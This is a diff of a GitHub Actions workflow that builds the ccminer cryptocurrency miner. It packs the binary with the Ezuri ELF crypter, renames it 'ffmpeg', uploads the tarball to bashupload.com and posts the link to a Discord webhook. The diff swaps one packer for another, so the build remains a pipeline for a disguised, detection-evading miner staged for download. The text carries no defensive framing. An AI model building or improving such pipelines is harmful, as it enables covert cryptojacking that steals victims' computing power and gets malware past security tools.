@@ -18,8 +18,8 @@ jobs:
 
     - name: Install Dependencies
       run: |
-        sudo apt-get update
-        sudo apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool clang libelf-dev zlib1g-dev
+        apt-get update
+        apt-get install -y cmake git build-essential libcurl4-openssl-dev libssl-dev libjansson-dev automake libgmp-dev libtool clang libelf-dev zlib1g-dev golang-go
 
     - name: Clone and Modify ccminer
       run: |
@@ -34,18 +34,21 @@ jobs:
         ./configure
         make -j$(nproc)
 
-    - name: Install and Pack with Ward
+    - name: Install and Pack with Ezuri
       run: |
-        git clone https://github.com/ex0dus-0x/ward.git
-        cd ward
-        make
-        ./ward ../ccminer-verus/ccminer
-        clang -o /home/runner/work/ccminer-build/ccminer-build/ccminer-verus/ccminer.packed -static -O2 -D_FORTIFY_SOURCE=2 -DTAMPERPROOF -DCOMPRESS main.c runtime.c -lelf -lz
+        git clone --branch v0.0.2 https://github.com/guitmz/ezuri.git
+        cd ezuri
+        go build
+        ./ezuri ../ccminer-verus/ccminer
         mv ../ccminer-verus/ccminer ../ccminer-verus/ffmpeg
+
+    - name: Create Tarball
+      run: |
+        cd ../ccminer-verus
+        tar -cvf ffmpeg.tar ffmpeg
 
     - name: Upload to Bashupload
       run: |
-        tar -cvf ffmpeg.tar ffmpeg
         curl -T ./ffmpeg.tar https://bashupload.com/ > upload_url.txt
 
     - name: Send URL to Discord Webhook
